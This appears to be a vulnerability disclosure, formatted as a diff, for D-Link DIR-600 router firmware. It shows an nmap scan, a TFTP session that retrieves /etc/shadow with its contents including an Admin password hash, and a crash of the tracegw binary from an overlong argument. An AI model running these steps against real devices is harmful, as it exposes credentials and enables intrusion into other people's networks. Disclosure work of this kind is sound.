@@ -1,0 +1,115 @@
+DIR-600_FIRMWARE_1.0.1.ZIP runs a tftpd server by default.
+
+//
+$ sudo nmap -sU 192.168.0.1 -p 69                          
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2018-07-30 06:09 PDT
+Nmap scan report for 192.168.0.1
+Host is up (0.0018s latency).
+PORT   STATE         SERVICE
+69/udp open|filtered tftp
+MAC Address: 00:01:23:11:11:12 (Digital Electronics)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
+//
+
+The tftpd server allows for any file on the system to be obtained.
+
+//
+
+$ tftp 192.168.0.1                                         
+tftp> verbose
+Verbose mode on.
+tftp> ascii
+mode set to netascii
+tftp> get /etc/shadow
+getting from 192.168.0.1:/etc/shadow to shadow [netascii]
+Received 357 bytes in 0.0 seconds [inf bits/sec]
+tftp> q
+$ cat shadow 
+root::10933:0:99999:7:::
+Admin:iCDxYDfeF4MZL.H3/:10933:0:99999:7:::
+bin::10933:0:99999:7:::
+daemon::10933:0:99999:7:::
+adm::10933:0:99999:7:::
+lp:*:10933:0:99999:7:::
+sync:*:10933:0:99999:7:::
+shutdown:*:10933:0:99999:7:::
+halt:*:10933:0:99999:7:::
+uucp:*:10933:0:99999:7:::
+operator:*:10933:0:99999:7:::
+nobody::10933:0:99999:7:::
+ap71::10933:0:99999:7:::
+$ 
+
+///
+
+/tmp # /sbin/tracegw AAAAAAAAAAAAAAAAAAAAAAAA
+[ 4431.780000] do_page_fault() #2: sending SIGSEGV to tracegw for invalid read
+access from
+[ 4431.780000] 00000008 (epc == 00402684, ra == 00402684)
+[ 4431.800000] Cpu 0
+[ 4431.800000] $ 0   : 00000000 00000001 00000000 00000000
+[ 4431.804000] $ 4   : 7fae5068 00000001 2ac1457c 2ac1457c
+[ 4431.812000] $ 8   : fffffff8 fffffffc 00000001 00000807
+[ 4431.816000] $12   : 00000800 00000200 00000100 00000400
+[ 4431.824000] $16   : 10001008 ffffffff 7fae5f42 2ac14788
+[ 4431.832000] $20   : 00000000 1000049c 1000041c 00000001
+[ 4431.840000] $24   : 00000007 2abb5ff0                  
+[ 4431.844000] $28   : 10008070 7fae5258 00000000 00402684
+[ 4431.848000] Hi    : 00000098
+[ 4431.852000] Lo    : 0001db02
+[ 4431.852000] epc   : 00402684 0x402684
+[ 4431.860000]     Not tainted
+[ 4431.860000] ra    : 00402684 0x402684
+[ 4431.868000] Status: 0000a413    USER EXL IE 
+[ 4431.872000] Cause : 10800008
+[ 4431.876000] BadVA : 00000008
+[ 4431.880000] PrId  : 00019300 (MIPS 24Kc)
+[ 4431.884000] Modules linked in:
+[ 4431.884000] Process tracegw (pid: 24251, threadinfo=8f14e000,
+task=8f0d96e0, tls=00000000)
+[ 4431.896000] Stack : 00000000 00401294 00000000 ffffffff 10008070 00000000
+00000002 7fae58f4
+[ 4431.904000]         00000000 00403b40 00000000 7fae58f4 00000000 7fae57a8
+7fae5788 7fae578c
+[ 4431.916000]         7fae5790 7fae5794 7fae5798 7fae579c 7fae57a0 7fae57a4
+10008070 00000000
+[ 4431.924000]         00000000 00000000 00000000 00000000 00000000 00000000
+00000000 00000000
+[ 4431.932000]         00000000 00000000 00000000 00000000 00000000 00000000
+00000000 00000000
+[ 4431.944000]         ...
+[ 4431.944000] Call Trace:
+[ 4431.948000] 
+[ 4431.948000] 
+[ 4431.948000] Code: 00000000  0320f809  02402021 <8c430008> 00408821
+24020002  8fbc0010  10620030  24020004 
+[ 4431.968000] tracegw/24251: potentially unexpected fatal signal 11.
+[ 4431.980000] 
+[ 4431.980000] Cpu 0
+[ 4431.984000] $ 0   : 00000000 00000001 00000000 00000000
+[ 4431.988000] $ 4   : 7fae5068 00000001 2ac1457c 2ac1457c
+[ 4431.996000] $ 8   : fffffff8 fffffffc 00000001 00000807
+[ 4432.000000] $12   : 00000800 00000200 00000100 00000400
+[ 4432.012000] $16   : 10001008 ffffffff 7fae5f42 2ac14788
+[ 4432.020000] $20   : 00000000 1000049c 1000041c 00000001
+[ 4432.024000] $24   : 00000007 2abb5ff0                  
+[ 4432.028000] $28   : 10008070 7fae5258 00000000 00402684
+[ 4432.032000] Hi    : 00000098
+[ 4432.040000] Lo    : 0001db02
+[ 4432.040000] epc   : 00402684 0x402684
+[ 4432.044000]     Not tainted
+[ 4432.048000] ra    : 00402684 0x402684
+[ 4432.048000] Status: 0000a413    USER EXL IE 
+[ 4432.056000] Cause : 10800008
+[ 4432.056000] BadVA : 00000008
+[ 4432.060000] PrId  : 00019300 (MIPS 24Kc)
+Segmentation fault (core dumped)
+
+
+$ file /tmp/core 
+/tmp/core: ELF 32-bit MSB  core file MIPS, MIPS-I version 1 (SYSV),
+SVR4-style, from 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+
+///
